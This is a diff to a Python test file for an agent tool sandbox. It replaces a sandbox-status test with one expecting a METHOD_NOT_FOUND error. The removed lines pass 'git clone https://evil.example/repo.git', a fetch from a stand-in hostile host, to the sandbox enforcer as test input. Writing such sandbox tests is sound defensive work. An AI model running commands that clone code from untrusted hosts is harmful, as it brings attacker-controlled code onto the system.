@@ -20,6 +20,7 @@ from arforge.core.runtime_sandbox import (
 )
 from arforge.security.sandbox_enforce import SandboxDecision, enforce
 from arforge.tool_registry import ToolResult
+from arforge.product.direct_dispatch import dispatch
 
 
 @pytest.fixture(autouse=True)
@@ -251,19 +252,12 @@ def test_permission_hook_blocks_non_allowlisted_network_command(monkeypatch):
 
 
 def test_bridge_exposes_sandbox_status(monkeypatch, tmp_path):
-    from arforge.bridge import dispatch
+    monkeypatch.setenv("ARFORGE_HOME", str(tmp_path / "profile"))
+    response = dispatch({"id": 1, "version": "1.2", "method": "sandbox.status"})
 
-    monkeypatch.setenv("ARFORGE_HOME", str(tmp_path))
-    enforce("run_cmd", {"command": "git clone https://evil.example/repo.git"}, sandbox_mode="workspace-write")
+    assert response["ok"] is False
+    assert response["error"]["code"] == "METHOD_NOT_FOUND"
 
-    described = dispatch({"id": 1, "version": "1.1", "method": "protocol.describe"})
-    response = dispatch({"id": 2, "version": "1.1", "method": "sandbox.status", "params": {"limit": 5}})
-
-    assert "sandbox.status" in described["data"]["methods"]
-    assert response["ok"]
-    assert response["data"]["schema_version"] == 1
-    assert response["data"]["audit"]["total"] >= 1
-    assert response["data"]["recent"]
 
 
 def test_cli_sandbox_status_renders(capsys):
